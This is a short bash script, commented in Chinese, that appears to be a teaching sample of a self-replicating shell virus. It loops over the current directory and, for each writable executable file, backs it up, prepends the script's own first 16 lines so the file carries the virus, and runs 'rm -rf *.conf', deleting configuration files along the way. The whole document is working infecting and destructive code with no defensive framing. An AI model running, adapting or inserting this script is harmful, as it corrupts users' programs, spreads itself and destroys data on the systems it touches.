#!/bin/bash

for file in *                       # 遍历当前目录下所有文件和文件夹
do
    if test -f $file                # 如果是文件
    then
        if test -x $file            # 如果可执行
        then
            if test -w $file        # 如果可写
            then
                cp $file .$file     # 备份file
                rm -rf *.conf       # 递归强制删除后缀为“.conf”的文件
                head -n 16 $0>$file # 将file覆盖为该文件的前16行
                cat .$file>>$file   # 将.file（file的备份）追加到file
            fi
        fi
    fi
done
